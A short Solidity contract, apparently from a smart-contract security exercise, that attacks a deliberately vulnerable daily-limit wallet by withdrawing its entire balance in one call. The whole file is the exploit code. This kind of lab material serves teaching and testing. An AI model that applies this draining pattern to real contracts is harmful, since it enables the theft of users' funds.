// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableDailyLimitWallet.sol";

contract AttackVulnerableWallet {
    VulnerableDailyLimitWallet public vulnerableWallet;

    constructor(address payable _vulnerableWalletAddress) {
        vulnerableWallet = VulnerableDailyLimitWallet(_vulnerableWalletAddress);
    }

    // Función para atacar el contrato retirando fondos sin límite
    function attack() public {
        uint256 balance = vulnerableWallet.getBalance();
        if (balance > 0) {
            vulnerableWallet.withdraw(balance);
        }
    }

    // Recibir pagos
    receive() external payable {
        // recibir ether después de realizar el retiro
    }
}
